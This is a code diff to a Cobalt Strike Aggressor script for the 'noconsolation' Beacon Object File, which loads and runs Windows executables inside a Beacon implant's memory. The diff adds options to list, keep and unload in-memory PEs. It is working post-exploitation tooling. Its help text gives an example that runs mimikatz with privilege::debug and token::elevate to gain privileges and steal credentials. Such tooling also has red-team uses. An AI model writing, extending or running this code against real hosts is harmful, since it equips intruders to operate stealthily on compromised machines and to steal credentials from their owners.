@@ -1,13 +1,15 @@
 
 alias noconsolation
 {
-    local('$bid $barch $PE $args $path $path_set $pebytes $x $matchfound $local $cmdline $headers $method $use_unicode $timeout $nooutput $alloc_console $close_handles $free_libs');
+    local('$bid $barch $PE $args $path $path_set $name_set $pebytes $x $matchfound $pe_id $local $cmdline $headers $method $use_unicode $timeout $nooutput $alloc_console $close_handles $free_libs $dont_save $list_pes $unload_pe');
 
     $bid = $1;
+    $pe_id = 0;
     $local = 0;
     $i = 1;
     $path = '';
     $path_set = 0;
+    $name_set = 0;
     $pebytes = '';
     $headers = 0;
     $method = '';
@@ -17,6 +19,9 @@ alias noconsolation
     $alloc_console = 0;
     $close_handles = 0;
     $free_libs = 0;
+    $dont_save = 0;
+    $list_pes = 0;
+    $unload_pe = '';
 
     # make sure the beacon is not WoW64
     $is64 = binfo($bid, "is64");
@@ -92,6 +97,26 @@ alias noconsolation
         {
             $free_libs = 1;
         }
+        else if (@_[$i] eq "--dont-save" || @_[$i] eq "-ds")
+        {
+            $dont_save = 1;
+        }
+        else if (@_[$i] eq "--list-pes" || @_[$i] eq "-lpe")
+        {
+            $list_pes = 1;
+        }
+        else if (@_[$i] eq "--unload-pe" || @_[$i] eq "-upe")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --unload-pe value");
+                return;
+            }
+
+            $unload_pe = @_[$i];
+        }
         else if (-exists @_[$i] || @_[$i] ismatch '^\p{Alpha}:\\\\.*')
         {
             $path_set = 1;
@@ -102,6 +127,12 @@ alias noconsolation
         {
             berror($bid, "Specified executable ". @_[$i] ." does not exist");
             return;
+        }
+        else if ($local == 0 && @_[$i] ismatch '^\p{Alpha}.*\.exe')
+        {
+            $name_set = 1;
+            $pename = @_[$i];
+            break;
         }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
@@ -116,7 +147,7 @@ alias noconsolation
     }
 
     # allow users to close all handles without having to run a PE
-    if ($path_set == 0 && $close_handles == 0)
+    if (strlen($unload_pe) == 0 && $list_pes == 0 && $name_set == 0 && $path_set == 0 && $close_handles == 0)
     {
         berror($1, "PE path not provided");
         return;
@@ -125,6 +156,24 @@ alias noconsolation
     if ($path_set && !-exists $path && $local == 0)
     {
         berror($bid, "Specified executable ". $path ." does not exist");
+        return;
+    }
+
+    if ($path_set && $list_pes)
+    {
+        berror($bid, "The option --list-pes must be ran alone");
+        return;
+    }
+
+    if (strlen($unload_pe) != 0 && $list_pes)
+    {
+        berror($bid, "The option --list-pes must be ran alone");
+        return;
+    }
+
+    if ($path_set && strlen($unload_pe) != 0)
+    {
+        berror($bid, "The option --unload-pe must be ran alone");
         return;
     }
 
@@ -148,7 +197,10 @@ alias noconsolation
         {
             $pename = split('\\\\', $path, 50)[-1];
         }
+    }
 
+    if ($path_set || $name_set)
+    {
         # Iterate through args given
         $cmdline = $pename;
         for ($y = $i + 1; $y < size(@_); $y++)
@@ -160,7 +212,7 @@ alias noconsolation
         }
     }
 
-    runpe($bid, $pebytes, $path, $local, $timeout, $headers, $cmdline, $method, $use_unicode, $nooutput, $alloc_console, $close_handles, $free_libs);
+    runpe($bid, $pename, $pebytes, $path, $local, $timeout, $headers, $cmdline, $method, $use_unicode, $nooutput, $alloc_console, $close_handles, $free_libs, $dont_save, $list_pes, $unload_pe, mynick(), tstamp(ticks()));
 }
 
 sub runpe{
@@ -176,7 +228,7 @@ sub runpe{
     }
 
     # Pack the arguments
-    $args = bof_pack($1, "bziiiZzziiiii", $2, $3, $4, $5, $6, $7, $7, $8, $9, $10, $11, $12, $13);
+    $args = bof_pack($1, "zbziiiZzziiiiiiizzz", $2, $3, $4, $5, $6, $7, $8, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19);
 
     # Execute BOF
     beacon_inline_execute($1, $data, "go", $args);
@@ -198,10 +250,14 @@ Usage: noconsolation [--local] [--timeout 60] [-k] [--method funcname] [-w] [--n
     --alloc-console, -ac                  Optional. Allocate a console. This will spawn a new process
     --close-handles, -ch                  Optional. Close Pipe handles once finished. If PowerShell was already ran, this will break the output for PowerShell in the future
     --free-libraries, -fl                 Optional. Free all loaded DLLs
-    /path/to/binary.exe                   Required. Full path to the windows EXE/DLL you wish you run inside Beacon
+    --dont-save, -ds                      Optional. Do not save this binary in memory
+    --list-pes, -lpe                      Optional. List all PEs that have been loaded in memory
+    --unload-pe PE_NAME, -upe PE_NAME     Optional. Unload from memory a PE
+    /path/to/binary.exe                   Required. Full path to the windows EXE/DLL you wish you run inside Beacon. If already loaded, you can simply specify the binary name.
     ARG1 ARG2                             Optional. Parameters for the PE. Must be provided after the path
 
     Example: noconsolation --local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \$ExecutionContext.SessionState.LanguageMode
     Example: noconsolation /tmp/mimikatz.exe privilege::debug token::elevate exit
     Example: noconsolation --local C:\\windows\\system32\\cmd.exe /c ipconfig
+    Example: noconsolation LoadedBinary.exe args
 ");
